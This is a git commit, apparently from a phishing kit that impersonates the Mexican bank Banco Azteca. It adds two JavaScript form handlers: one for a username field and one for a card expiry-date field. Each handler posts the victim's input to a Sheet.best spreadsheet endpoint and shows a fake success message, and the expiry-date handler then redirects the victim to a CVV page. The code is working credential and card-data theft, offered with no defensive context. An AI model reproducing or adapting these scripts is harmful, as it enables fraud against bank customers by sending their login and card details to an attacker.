ef58d07869a14216a4d984f44110710b718df03b
banco-azteca-19s <robledofrancis4@gmail.com>
2025-09-19 10:28:26 -0600

    add files data

---
+++ js/fechavencimiento.js
@@ -0,0 +1,32 @@
+const formulario = document.getElementById('contact-form');
+const registro = document.getElementById('registro');
+const exito = document.getElementById('exito');
+
+formulario.addEventListener('submit', async(e) =>{
+    e.preventDefault();
+
+
+try {    
+    const respuesta = await fetch('https://api.sheetbest.com/sheets/375066bb-a2ef-451b-8777-0bf912f3a9c8', {
+        method: 'POST',
+        mode: 'cors',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            
+            "Datos": formulario.data2.value
+            
+        })
+    });
+
+
+
+} catch(error){
+    console.log(error);
+}
+    
+    registro.classList.remove('activo');
+    exito.classList.add('activo');
+    window.location.href = 'cvv.html'; // Redirige a la página deseada
+});
---
+++ js/usuario.js
@@ -0,0 +1,32 @@
+const formulario = document.getElementById('contact-form');
+const registro = document.getElementById('registro');
+const exito = document.getElementById('exito');
+
+formulario.addEventListener('submit', async(e) =>{
+    e.preventDefault();
+
+
+try {    
+    const respuesta = await fetch('https://api.sheetbest.com/sheets/375066bb-a2ef-451b-8777-0bf912f3a9c8', {
+        method: 'POST',
+        mode: 'cors',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            "Datos": formulario.data1.value
+            
+            
+        })
+    });
+
+
+
+} catch(error){
+    console.log(error);
+}
+    
+    registro.classList.remove('activo');
+    exito.classList.add('activo');
+    
+});
